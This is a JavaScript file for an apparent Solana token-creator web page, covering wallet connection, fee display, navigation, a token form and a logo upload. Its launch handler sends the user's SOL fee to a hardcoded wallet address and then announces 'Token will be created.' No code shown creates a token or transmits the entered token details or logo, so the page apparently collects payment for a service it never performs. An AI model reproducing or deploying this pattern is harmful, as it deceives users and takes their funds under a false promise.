document.addEventListener('DOMContentLoaded', function() {
    const socialToggle = document.getElementById('social-links-toggle');
    const feeInfo = document.getElementById('fee-info');
    
    // Initial fee setup
    let baseFee = 0.3;
    let socialFee = 0.1;
    let totalFee = baseFee;

    // Function to update the fee display
    function updateFeeDisplay() {
        const additionalFees = [];
        
        if (socialToggle.checked) {
            additionalFees.push({
                name: 'Social Links',
                value: socialFee
            });
        }
        
        // Calculate total fee
        totalFee = baseFee + additionalFees.reduce((sum, fee) => sum + fee.value, 0);
        
        // Update display
        feeInfo.innerHTML = `
            <div class="base-fee">Base fee: <span>${baseFee} SOL</span></div>
            ${additionalFees.length > 0 ? `
                <div class="additional-fees">
                    ${additionalFees.map(fee => `
                        <div class="fee-item">
                            <span>${fee.name}:</span>
                            <span class="fee-value">+${fee.value} SOL</span>
                        </div>
                    `).join('')}
                </div>
            ` : ''}
            <div class="total-fee">Total: ${totalFee} SOL</div>
        `;
    }
    
    // Listen for checkbox changes
    socialToggle.addEventListener('change', updateFeeDisplay);
    
    // Initial update
    updateFeeDisplay();
});

// =============================================
// MAIN SETUP
// =============================================

const APP_ENV = 'production'; // 'development' or 'production'
const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta'); // 'devnet' for testing

// =============================================
// GLOBAL VARIABLES
// =============================================

let wallet;
let connection;
let currentSection = 'home';

// =============================================
// APPLICATION INITIALIZATION
// =============================================

document.addEventListener('DOMContentLoaded', async function() {
    // 1. Initialize connection to blockchain
    connection = new solanaWeb3.Connection(NETWORK, 'confirmed');
    
    // 2. Initialize wallet
    await initWallet();
    
    // 3. Initialize navigation
    initNavigation();
    
    // 4. Initialize token form
    initTokenForm();
    
    // 5. Initialize logo upload
    initLogoUpload();
    
    console.log('Application initialized');
});

// =============================================
// PHANTOM WALLET INTEGRATION
// =============================================

async function initWallet() {
    // Development mode (mock Phantom if not available)
    if (APP_ENV === 'development' && !window.solana) {
        console.warn('Development mode - Phantom is not available');
        window.solana = {
            connect: async () => ({ 
                publicKey: { 
                    toString: () => 'DEV_TEST_WALLET' 
                } 
            }),
            isConnected: false,
            on: () => {},
            disconnect: async () => {}
        };
    }

    if (!window.solana) {
        console.error('Phantom Wallet not available!');
        return;
    }

    wallet = window.solana;
    
    // Auto-connect if wallet is already connected
    if (wallet.isConnected) {
        await handleWalletConnect();
    }
    
    // Event listeners for wallet
    wallet.on('connect', handleWalletConnect);
    wallet.on('disconnect', handleWalletDisconnect);
    
    // Connect button initialization
    document.getElementById('connect-wallet').addEventListener('click', toggleWalletConnection);
}

async function toggleWalletConnection() {
    try {
        if (!wallet.isConnected) {
            await wallet.connect();
        } else {
            await wallet.disconnect();
        }
    } catch (error) {
        console.error('Connection error:', error);
        alert('Error connecting wallet: ' + error.message);
    }
}

async function handleWalletConnect() {
    const connectBtn = document.getElementById('connect-wallet');
    const walletAddress = document.getElementById('wallet-address');
    
    if (wallet && wallet.publicKey) {
        const shortAddress = `${wallet.publicKey.toString().slice(0, 4)}...${wallet.publicKey.toString().slice(-4)}`;
        
        connectBtn.textContent = 'Connected';
        connectBtn.classList.add('connected');
        walletAddress.textContent = shortAddress;
        walletAddress.style.display = 'block';
        
        console.log('Wallet connected:', wallet.publicKey.toString());
    }
}

function handleWalletDisconnect() {
    const connectBtn = document.getElementById('connect-wallet');
    const walletAddress = document.getElementById('wallet-address');
    
    connectBtn.textContent = 'Connect Wallet';
    connectBtn.classList.remove('connected');
    walletAddress.style.display = 'none';
    
    console.log('Wallet disconnected');
}

// =============================================
// SECTION NAVIGATION
// =============================================

function initNavigation() {
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav-link');
    
    // Show selected section
    function showSection(sectionId) {
        // Hide all sections
        sections.forEach(section => {
            section.classList.remove('active-section');
            section.classList.add('hidden-section');
        });
        
        // Show selected section
        const targetSection = document.getElementById(sectionId);
        if (targetSection) {
            targetSection.classList.remove('hidden-section');
            targetSection.classList.add('active-section');
            currentSection = sectionId;
        }
        
        // Update active navigation links
        navLinks.forEach(link => {
            if (link.getAttribute('href').startsWith('#')) {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${sectionId}`) {
                    link.classList.add('active');
                }
            }
        });
        
        // Scroll to top
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    
    // Event listener for navigation clicks
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            // Internal links
            if (href.startsWith('#')) {
                e.preventDefault();
                const targetSection = href.substring(1);
                showSection(targetSection);
                history.pushState(null, null, href);
            }
        });
    });
    
    // Handle "Create Token" button on home page
    const homeCreateBtn = document.querySelector('.hero-text .create-token-btn');
    if (homeCreateBtn) {
        homeCreateBtn.addEventListener('click', function(e) {
            e.preventDefault();
            showSection('create-token');
            history.pushState(null, null, '#create-token');
        });
    }
    
    // Handle browser history
    window.addEventListener('popstate', function() {
        const hash = window.location.hash.substring(1);
        if (hash && document.getElementById(hash)) {
            showSection(hash);
        } else {
            showSection('home');
        }
    });
    
    // Initialize initial section
    const initialHash = window.location.hash.substring(1);
    showSection(initialHash || 'home');
}

// =============================================
// TOKEN CREATION FORM
// =============================================

function initTokenForm() {
    const launchBtn = document.querySelector('.launch-token-btn');
    if (!launchBtn) return;
    
    // Social media toggle handling
    document.getElementById('social-links-toggle').addEventListener('change', function() {
        const socialFields = document.getElementById('social-fields');
        if (this.checked) {
            socialFields.style.display = 'block';
        } else {
            socialFields.style.display = 'none';
        }
    });
    
    launchBtn.addEventListener('click', async function() {
        if (!wallet?.isConnected) {
            alert('Please connect your Phantom Wallet first!');
            return;
        }

        // Get form data
        const tokenName = document.getElementById('token-name').value.trim();
        const tokenSymbol = document.getElementById('token-symbol').value.trim().toUpperCase();
        const tokenDecimals = parseInt(document.getElementById('token-decimals').value);
        const tokenSupply = parseInt(document.getElementById('token-supply').value);
        const tokenDescription = document.getElementById('token-description').value.trim();

        // Validation
        if (!tokenName || tokenName.length > 32) {
            alert('Token name must be 1-32 characters long');
            return;
        }

        if (!tokenSymbol || tokenSymbol.length > 10) {
            alert('Token symbol must be 1-10 characters long');
            return;
        }

        if (isNaN(tokenSupply) || tokenSupply <= 0) {
            alert('Please enter a valid token supply');
            return;
        }

        // Get current fee
        const feeText = document.querySelector('.total-fee').textContent;
        const totalAmount = parseFloat(feeText.match(/[\d.]+/)[0]);
        const recipientAddress = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';

        try {
            // Confirm transaction
            const confirmTransaction = confirm(`Do you want to send ${totalAmount} SOL to the address ${recipientAddress}?`);
            if (!confirmTransaction) return;

            // Prepare transaction
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                    lamports: solanaWeb3.LAMPORTS_PER_SOL * totalAmount,
                })
            );

            // Send transaction
            const signature = await wallet.sendTransaction(transaction, connection);
            alert(`Transaction sent! Waiting for confirmation...\n\nSignature: ${signature}`);
            
            // Wait for confirmation
            const result = await connection.confirmTransaction(signature, 'confirmed');
            if (result.value.err) {
                throw new Error('Transaction failed');
            }

            alert('Transaction confirmed! Token will be created.');
        } catch (error) {
            console.error('Transaction error:', error);
            alert('Error: ' + error.message);
        }
    });
}

function initLogoUpload() {
    const uploadArea = document.getElementById('logo-upload-area');
    const logoInput = document.createElement('input');
    logoInput.type = 'file';
    logoInput.accept = '.jpg,.jpeg,.png';
    logoInput.hidden = true;
    document.body.appendChild(logoInput);

    // Handle click
    uploadArea.addEventListener('click', () => logoInput.click());

    // Handle drag & drop
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('dragover');
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('dragover');
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('dragover');
        if (e.dataTransfer.files.length) {
            logoInput.files = e.dataTransfer.files;
            handleLogoUpload(logoInput.files[0]);
        }
    });

    // Handle file selection
    logoInput.addEventListener('change', () => {
        if (logoInput.files.length) {
            handleLogoUpload(logoInput.files[0]);
        }
    });

    function handleLogoUpload(file) {
        if (!file.type.match('image.*')) {
            alert('Please select an image file (PNG/JPG)');
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            uploadArea.innerHTML = '';
            const img = document.createElement('img');
            img.src = e.target.result;
            img.style.maxWidth = '100%';
            img.style.maxHeight = '100%';
            img.style.objectFit = 'contain';
            uploadArea.appendChild(img);
        };
        reader.readAsDataURL(file);
    }
}
